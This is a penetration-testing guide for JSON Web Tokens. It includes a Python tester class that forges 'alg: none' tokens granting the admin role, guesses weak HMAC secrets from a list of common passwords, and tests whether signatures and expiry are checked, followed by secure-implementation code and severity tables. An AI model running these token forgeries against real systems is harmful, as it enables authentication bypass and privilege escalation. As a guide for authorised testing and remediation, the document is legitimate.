# WSTG-SESS-10: Testing JSON Web Tokens (JWT)

## Test ID
WSTG-SESS-10

## Test Name
Testing JSON Web Tokens

## High-Level Description

JSON Web Tokens (JWT) are widely used for authentication and authorization. Misconfigurations in JWT implementation can lead to authentication bypass, privilege escalation, or information disclosure. This test evaluates the security of JWT generation, validation, and handling.

---

## What to Check

- [ ] Algorithm confusion (none, HS256/RS256)
- [ ] Weak signing secrets
- [ ] Missing signature validation
- [ ] Sensitive data in payload
- [ ] Token expiration (exp claim)
- [ ] Token revocation mechanism
- [ ] Key management

---

## How to Test

### Step 1: Decode and Analyze JWT

```bash
#!/bin/bash
# Decode JWT token
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Decode header
echo "$TOKEN" | cut -d'.' -f1 | base64 -d 2>/dev/null | jq '.'

# Decode payload
echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq '.'

# Check for:
# - Algorithm used (alg)
# - Sensitive data in payload
# - Expiration (exp)
# - Issuer (iss)
# - Subject (sub)
```

### Step 2: Test Algorithm Confusion

```python
#!/usr/bin/env python3
import base64
import json
import hmac
import hashlib
import requests

class JWTTester:
    def __init__(self, base_url, original_token):
        self.base_url = base_url
        self.original_token = original_token
        self.findings = []

    def decode_jwt(self, token):
        """Decode JWT without verification"""
        parts = token.split('.')
        header = json.loads(self._b64_decode(parts[0]))
        payload = json.loads(self._b64_decode(parts[1]))
        return header, payload

    def _b64_decode(self, data):
        """Base64 URL decode"""
        padding = 4 - len(data) % 4
        data += '=' * padding
        return base64.urlsafe_b64decode(data)

    def _b64_encode(self, data):
        """Base64 URL encode"""
        if isinstance(data, dict):
            data = json.dumps(data, separators=(',', ':'))
        if isinstance(data, str):
            data = data.encode()
        return base64.urlsafe_b64encode(data).decode().rstrip('=')

    def test_none_algorithm(self):
        """Test algorithm none attack"""
        print("[*] Testing 'none' algorithm attack...")

        header, payload = self.decode_jwt(self.original_token)

        # Create token with alg: none
        new_header = {"alg": "none", "typ": "JWT"}
        payload['role'] = 'admin'  # Try privilege escalation

        new_token = f"{self._b64_encode(new_header)}.{self._b64_encode(payload)}."

        # Test with no signature
        response = requests.get(
            f"{self.base_url}/api/protected",
            headers={"Authorization": f"Bearer {new_token}"}
        )

        if response.status_code == 200:
            print("[VULN] Algorithm 'none' accepted!")
            self.findings.append({
                "issue": "Algorithm none bypass",
                "severity": "Critical"
            })

    def test_weak_secret(self):
        """Test for weak signing secrets"""
        print("[*] Testing weak secrets...")

        header, payload = self.decode_jwt(self.original_token)

        if header.get('alg') not in ['HS256', 'HS384', 'HS512']:
            print("[INFO] Not using HMAC algorithm")
            return

        common_secrets = [
            'secret', 'password', '123456', 'key', 'private',
            'changeme', 'admin', 'jwt_secret', 'test',
        ]

        for secret in common_secrets:
            test_token = self._sign_token(header, payload, secret)

            response = requests.get(
                f"{self.base_url}/api/protected",
                headers={"Authorization": f"Bearer {test_token}"}
            )

            if response.status_code == 200:
                print(f"[VULN] Weak secret found: '{secret}'")
                self.findings.append({
                    "issue": f"Weak JWT secret: {secret}",
                    "severity": "Critical"
                })
                return

    def _sign_token(self, header, payload, secret):
        """Sign token with HMAC-SHA256"""
        header_b64 = self._b64_encode(header)
        payload_b64 = self._b64_encode(payload)
        message = f"{header_b64}.{payload_b64}"

        signature = hmac.new(
            secret.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()

        signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        return f"{message}.{signature_b64}"

    def test_signature_validation(self):
        """Test if signature is validated"""
        print("[*] Testing signature validation...")

        # Modify signature
        parts = self.original_token.split('.')
        modified_token = f"{parts[0]}.{parts[1]}.invalid_signature"

        response = requests.get(
            f"{self.base_url}/api/protected",
            headers={"Authorization": f"Bearer {modified_token}"}
        )

        if response.status_code == 200:
            print("[VULN] Invalid signature accepted!")
            self.findings.append({
                "issue": "No signature validation",
                "severity": "Critical"
            })

    def test_expiration(self):
        """Test if expiration is enforced"""
        print("[*] Testing expiration enforcement...")

        header, payload = self.decode_jwt(self.original_token)

        # Create expired token
        import time
        payload['exp'] = int(time.time()) - 3600  # 1 hour ago

        # Would need to sign with valid secret
        # This is a manual check - verify exp claim is present

        if 'exp' not in payload:
            print("[WARN] No expiration claim in token")
            self.findings.append({
                "issue": "Missing expiration claim",
                "severity": "Medium"
            })

    def test_sensitive_data(self):
        """Check for sensitive data in payload"""
        print("[*] Checking for sensitive data in payload...")

        header, payload = self.decode_jwt(self.original_token)

        sensitive_keys = ['password', 'secret', 'ssn', 'credit_card', 'api_key']

        for key in payload:
            if any(s in key.lower() for s in sensitive_keys):
                print(f"[VULN] Sensitive data in payload: {key}")
                self.findings.append({
                    "issue": f"Sensitive data in JWT: {key}",
                    "severity": "Medium"
                })

# Usage
tester = JWTTester("https://target.com", "your_jwt_token")
tester.test_none_algorithm()
tester.test_weak_secret()
tester.test_signature_validation()
tester.test_expiration()
tester.test_sensitive_data()
```

---

## Tools

| Tool | Description |
|------|-------------|
| **jwt.io** | JWT decoder |
| **jwt_tool** | JWT security testing |
| **hashcat** | Secret brute-forcing |

---

## Remediation Guide

### Secure JWT Implementation

```python
import jwt
from datetime import datetime, timedelta

# Use strong secret (256+ bits)
SECRET_KEY = os.environ.get('JWT_SECRET')  # Should be cryptographically random

def create_token(user_id, role):
    payload = {
        'sub': str(user_id),
        'role': role,
        'iat': datetime.utcnow(),
        'exp': datetime.utcnow() + timedelta(hours=1),
        'jti': secrets.token_hex(16)  # Unique token ID
    }

    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')

def verify_token(token):
    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=['HS256']  # Explicit algorithm
        )
        return payload
    except jwt.ExpiredSignatureError:
        raise AuthError("Token expired")
    except jwt.InvalidTokenError:
        raise AuthError("Invalid token")
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| Algorithm none bypass | 9.8 | Critical |
| Weak secret | 9.8 | Critical |
| No signature validation | 9.8 | Critical |
| Missing expiration | 5.3 | Medium |
| Sensitive data in payload | 5.3 | Medium |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-347** | Improper Verification of Cryptographic Signature |
| **CWE-757** | Selection of Less-Secure Algorithm During Negotiation |

---

## Checklist

```
[ ] JWT structure analyzed
[ ] Algorithm none tested
[ ] Weak secrets tested
[ ] Signature validation tested
[ ] Expiration checked
[ ] Sensitive data checked
[ ] Findings documented
```
